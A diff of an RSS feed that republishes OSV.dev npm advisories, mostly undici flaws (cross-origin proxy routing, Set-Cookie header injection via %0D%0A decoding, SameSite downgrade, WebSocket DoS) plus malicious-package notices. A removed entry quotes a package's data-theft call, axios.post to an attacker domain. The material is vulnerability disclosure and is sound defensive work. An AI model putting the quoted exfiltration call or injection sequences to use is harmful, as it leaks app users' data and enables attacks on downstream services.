@@ -3,12 +3,91 @@
   <title>OSV — new &amp; updated vulnerabilities: npm</title>
   <subtitle>Open-source vulns affecting npm packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:npm</id>
-  <updated>2026-06-20T13:46:43Z</updated>
+  <updated>2026-06-20T22:59:14Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/npm.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[NEW] GHSA-hm92-r4w5-c3mj: undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse</title>
+    <id>https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj"/>
+    <published>2026-06-19T14:20:20Z</published>
+    <updated>2026-06-20T22:59:14Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-6734"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-6734&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.2.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
+
+When using `Socks5ProxyAgent`, undici reuses a single connection pool across different origins without verifying that the pool&amp;#x27;s origin matches the requested origin. All requests are dispatched through the pool connected to the first origin, regardless of the intended destination.
+
+This causes cross-origin request routing: credentials and request data intended for origin B are sent to origin A, responses from the wrong origin are trusted, and HTTPS requests may be silently downgraded to HTTP.
+
+Impacted users are applications that use `Socks5ProxyAgent` (directly or via `setGlobalDispatcher`) and make requests to more than one origin.
+
+This was introduced in undici 7.23.0 via [#4385](https://github.com/nodejs/undici/pull/4385) and affects all versions through 8.1.0.
+
+## Patches
+
+…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6734"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6734&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/pull/5041"&gt;https://github.com/nodejs/undici/pull/5041&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-p88m-4jfj-68fv: undici vulnerable to HTTP header injection via Set-Cookie percent-decoding</title>
+    <id>https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv"/>
+    <published>2026-06-19T14:21:30Z</published>
+    <updated>2026-06-20T22:59:14Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-9679"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to HTTP header injection via Set-Cookie percent-decoding&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-9679&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
+
+undici&amp;#x27;s cookie parser in `parseSetCookie` percent-decodes cookie values via `qsUnescape`, turning encoded sequences like `%0D%0A`, `%00`, `%3B`, and `%3D` into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.
+
+Applications that parse a `Set-Cookie` header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary `Set-Cookie`, `Location`, or `Cache-Control` headers into the application&amp;#x27;s downstream response, enabling session fixation, open redirect, or cache poisoning.
+
+Affected applications are those that use undici&amp;#x27;s cookie parsing (`parseSetCookie`, `parseCookie`, `getSetCoo…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9679"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-9679&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-g8m3-5g58-fq7m: undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching</title>
+    <id>https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m"/>
+    <published>2026-06-19T14:34:46Z</published>
+    <updated>2026-06-20T22:59:14Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-11525"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-11525&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
+
+When undici parses a `Set-Cookie` header, it accepts any `SameSite` attribute value that contains `Strict`, `Lax`, or `None` as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:
+
+- `SameSite=NoneOfYourBusiness` is parsed as `None`, the most permissive setting.
+- `SameSite=StrictLax` is parsed as `Lax`, a downgrade from `Strict`.
+
+Affected applications are those that consume `Set-Cookie` headers from server responses (for example via undici&amp;#x27;s `fetch` or proxy code paths) and then forward or rely on the parsed `sameSite` attribute. A malicious or non-compliant server can coerce the consumer&amp;#x27;s view of a cookie&amp;#x27;s SameSite policy to a weaker value, silently degrading the SameSite e…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11525"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-11525&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-vxpw-j846-p89q: undici WebSocket client vulnerable to denial of service via fragment count bypass</title>
+    <id>https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q"/>
+    <published>2026-06-19T14:22:01Z</published>
+    <updated>2026-06-20T22:59:14Z</updated>
+    <category term="npm"/>
+    <category term="CVE-2026-12151"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;undici WebSocket client vulnerable to denial of service via fragment count bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-12151&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
+
+The undici WebSocket client enforces `maxPayloadSize` on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.
+
+Affected applications are those using the undici WebSocket client (`new WebSocket(...)`) or the `WebSocketStream` API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.
+
+All releases starting at undici 6.17.0 are affected.
+
+## Patches
+
+Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.
+
+## Workarounds
+
+No workaround is ava…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12151"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-12151&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
   <entry>
     <title>[NEW] MAL-2026-6238: Malicious code in atlasora-client (npm)</title>
     <id>https://osv.dev/vulnerability/MAL-2026-6238</id>
@@ -1080,23 +1159,6 @@ Parse Server is vulnerable to denial of service. A remote attacker can send a si
 The internal query-traversal helper that previously re-walked nested arrays — causing exponential-time processing of nested `$…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8"&gt;https://github.com/parse-community/parse-server/security/advisories/GHSA-cgxm-vr2f-6fj8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/parse-community/parse-server/pull/10511"&gt;https://github.com/parse-community/parse-server/pull/10511&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/parse-community/parse-server/pull/10512"&gt;https://github.com/parse-community/parse-server/pull/10512&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/parse-community/parse-server"&gt;https://github.com/parse-community/parse-server&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-cgxm-vr2f-6fj8"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <title>[NEW] GHSA-g8m3-5g58-fq7m: undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching</title>
-    <id>https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m"/>
-    <published>2026-06-19T14:34:46Z</published>
-    <updated>2026-06-19T14:45:21Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-11525"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to Set-Cookie SameSite attribute downgrade via permissive substring matching&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-11525&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
-
-When undici parses a `Set-Cookie` header, it accepts any `SameSite` attribute value that contains `Strict`, `Lax`, or `None` as a substring, rather than the case-insensitive exact match specified by RFC 6265. Non-spec values are silently mapped to one of the three standard tokens:
-
-- `SameSite=NoneOfYourBusiness` is parsed as `None`, the most permissive setting.
-- `SameSite=StrictLax` is parsed as `Lax`, a downgrade from `Strict`.
-
-Affected applications are those that consume `Set-Cookie` headers from server responses (for example via undici&amp;#x27;s `fetch` or proxy code paths) and then forward or rely on the parsed `sameSite` attribute. A malicious or non-compliant server can coerce the consumer&amp;#x27;s view of a cookie&amp;#x27;s SameSite policy to a weaker value, silently degrading the SameSite e…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-g8m3-5g58-fq7m&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11525"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-11525&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-g8m3-5g58-fq7m"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <title>[NEW] GHSA-35p6-xmwp-9g52: undici vulnerable to HTTP response queue poisoning via keep-alive socket reuse</title>
     <id>https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52</id>
     <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52"/>
@@ -1117,68 +1179,6 @@ Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.
 ## Workarounds
 
 Disable keep-alive connection reuse by setting `keepAliveTimeout: 0` on the Client or Pool.&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-35p6-xmwp-9g52"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-35p6-xmwp-9g52&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6733"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6733&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://hackerone.com/reports/3582376"&gt;https://hackerone.com/reports/3582376&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-35p6-xmwp-9g52"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-vxpw-j846-p89q: undici WebSocket client vulnerable to denial of service via fragment count bypass</title>
-    <id>https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q"/>
-    <published>2026-06-19T14:22:01Z</published>
-    <updated>2026-06-19T14:30:07Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-12151"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;undici WebSocket client vulnerable to denial of service via fragment count bypass&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-12151&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
-
-The undici WebSocket client enforces `maxPayloadSize` on the cumulative byte count of fragments in a message but does not enforce a limit on the number of fragments. A malicious WebSocket server can stream many small or empty continuation frames that each pass per-frame and cumulative-size validation, collectively causing unbounded memory growth in the client process. The result is memory exhaustion and a denial of service.
-
-Affected applications are those using the undici WebSocket client (`new WebSocket(...)`) or the `WebSocketStream` API that can be induced to connect to an attacker-controlled or compromised WebSocket endpoint.
-
-All releases starting at undici 6.17.0 are affected.
-
-## Patches
-
-Upgrade to undici v6.27.0, v7.28.0 or v8.5.0.
-
-## Workarounds
-
-No workaround is ava…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-vxpw-j846-p89q&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12151"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-12151&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-vxpw-j846-p89q"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-hm92-r4w5-c3mj: undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse</title>
-    <id>https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj"/>
-    <published>2026-06-19T14:20:20Z</published>
-    <updated>2026-06-19T14:30:07Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-6734"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to cross-origin request routing via SOCKS5 proxy pool reuse&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-6734&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.2.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
-
-When using `Socks5ProxyAgent`, undici reuses a single connection pool across different origins without verifying that the pool&amp;#x27;s origin matches the requested origin. All requests are dispatched through the pool connected to the first origin, regardless of the intended destination.
-
-This causes cross-origin request routing: credentials and request data intended for origin B are sent to origin A, responses from the wrong origin are trusted, and HTTPS requests may be silently downgraded to HTTP.
-
-Impacted users are applications that use `Socks5ProxyAgent` (directly or via `setGlobalDispatcher`) and make requests to more than one origin.
-
-This was introduced in undici 7.23.0 via [#4385](https://github.com/nodejs/undici/pull/4385) and affects all versions through 8.1.0.
-
-## Patches
-
-…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-hm92-r4w5-c3mj&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6734"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-6734&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/pull/5041"&gt;https://github.com/nodejs/undici/pull/5041&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-hm92-r4w5-c3mj"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[NEW] GHSA-p88m-4jfj-68fv: undici vulnerable to HTTP header injection via Set-Cookie percent-decoding</title>
-    <id>https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv"/>
-    <published>2026-06-19T14:21:30Z</published>
-    <updated>2026-06-19T14:30:07Z</updated>
-    <category term="npm"/>
-    <category term="CVE-2026-9679"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;undici vulnerable to HTTP header injection via Set-Cookie percent-decoding&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-9679&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 6.27.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 7.28.0&lt;/li&gt;&lt;li&gt;&lt;code&gt;undici&lt;/code&gt; — fixed in 8.5.0&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Impact
-
-undici&amp;#x27;s cookie parser in `parseSetCookie` percent-decodes cookie values via `qsUnescape`, turning encoded sequences like `%0D%0A`, `%00`, `%3B`, and `%3D` into their literal byte equivalents. RFC 6265 §5.4 does not specify any decoding and browsers do not decode either.
-
-Applications that parse a `Set-Cookie` header and then forward the parsed value into a response header (proxies, middleware, SSR frameworks) become vulnerable to HTTP response header injection: an attacker-controlled upstream can inject arbitrary `Set-Cookie`, `Location`, or `Cache-Control` headers into the application&amp;#x27;s downstream response, enabling session fixation, open redirect, or cache poisoning.
-
-Affected applications are those that use undici&amp;#x27;s cookie parsing (`parseSetCookie`, `parseCookie`, `getSetCoo…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv"&gt;https://github.com/nodejs/undici/security/advisories/GHSA-p88m-4jfj-68fv&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2026-9679"&gt;https://nvd.nist.gov/vuln/detail/CVE-2026-9679&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://cna.openjsf.org/security-advisories.html"&gt;https://cna.openjsf.org/security-advisories.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/nodejs/undici"&gt;https://github.com/nodejs/undici&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-p88m-4jfj-68fv"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
     <title>[NEW] GHSA-qw6v-5fcf-5666: Network-AI: Improper Neutralization of Special Elements used in an OS Command </title>
@@ -1626,469 +1626,5 @@ This affects current `3.4.6`. The recent `IN_PLACE` hardening work covers clobbe
 
 - DOMPurify `3.4.6`
 - Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` on attacke…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4"&gt;https://github.com/cure53/DOMPurify/security/advisories/GHSA-x4vx-rjvf-j5p4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/cure53/DOMPurify"&gt;https://github.com/cure53/DOMPurify&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-x4vx-rjvf-j5p4"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6156: Malicious code in documents-widgets (npm)</title>
-    <id>https://osv.dev/vulnerability/MAL-2026-6156</id>
-    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6156"/>
-    <published>2026-06-17T12:00:00Z</published>
-    <updated>2026-06-19T01:16:50Z</updated>
-    <category term="npm"/>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in documents-widgets (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;documents-widgets&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The npm package `documents-widgets` (published by npm user `sproger`, slavatopbuyer@gmail.com) is a deceptive React Native component and part of a coordinated 37-package campaign across two attacker-controlled domains (surrprisingcoompanny.lol and barbellmate.xyz). On component mount it registers `appsFlyer.onInstallConversionData` and exfiltrates the app&amp;#x27;s install/conversion attribution data via `axios.post(&amp;quot;https://surrprisingcoompanny.lol&amp;quot;, data)`, fetches a remote-config URL, and renders it full-screen in a `react-native-webview` that is hidden (display:&amp;#x27;none&amp;#x27;) unless the server returns a valid URL — i.e. App Store review-evasion / attribution-laundering (&amp;#x27;cloaking&amp;#x27;). The package name is a decoy unrelated to its actual function, and the real logic is concealed behind junk &amp;#x27;calculator&amp;#x27; …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/documents-widgets"&gt;https://www.npmjs.com/package/documents-widgets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6156"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <title>[UPDATED] MAL-2026-6154: Malicious code in datapersistence-steppers-ai (npm)</title>
